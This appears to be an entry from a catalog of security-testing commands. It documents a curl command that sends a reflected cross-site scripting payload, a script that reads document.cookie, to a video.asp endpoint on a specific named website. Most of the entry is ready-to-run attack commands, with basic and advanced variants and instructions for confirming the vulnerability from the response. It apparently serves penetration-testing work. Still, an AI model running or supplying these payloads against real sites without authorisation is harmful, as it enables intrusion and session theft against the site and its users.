---
id: cmd-uuid-curl-xss
name: curl-xss-injection
type: command
executor: bash
data: >-
  curl
  "http://www.grouplogic.com/video.asp?v=Acroxx1%22%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Es_aE&e=mp4&width=560&height=315"
  -v
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.230Z'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - xss
  - web
  - testing
verified: false
validated: true
submitted: true
---

# curl-xss-injection

## Command

```bash
curl "http://www.grouplogic.com/video.asp?v=Acroxx1%22%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Es_aE&e=mp4&width=560&height=315" -v
```

## Description

This command uses curl to send a GET request to the vulnerable video.asp endpoint with a URL-encoded XSS payload in the 'v' parameter, testing for reflected XSS by checking if the payload appears in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The full URL with encoded payload in 'v' parameter | Yes |
| -v | Verbose mode to display request and response details | No |

## Examples

### Basic Usage

```bash
curl "http://www.grouplogic.com/video.asp?v=<script>alert(1)</script>" -v
```

### Advanced Usage

```bash
curl "http://www.grouplogic.com/video.asp?v=Acroxx1%22%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Es_aE&e=mp4&width=560&height=315" -o response.html -v
```

## Expected Output

Verbose output showing the HTTP request and response, with the payload reflected in the HTML body if vulnerable. Look for the unescaped <script> tag in the response to confirm the issue.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-Video-Parameter]]
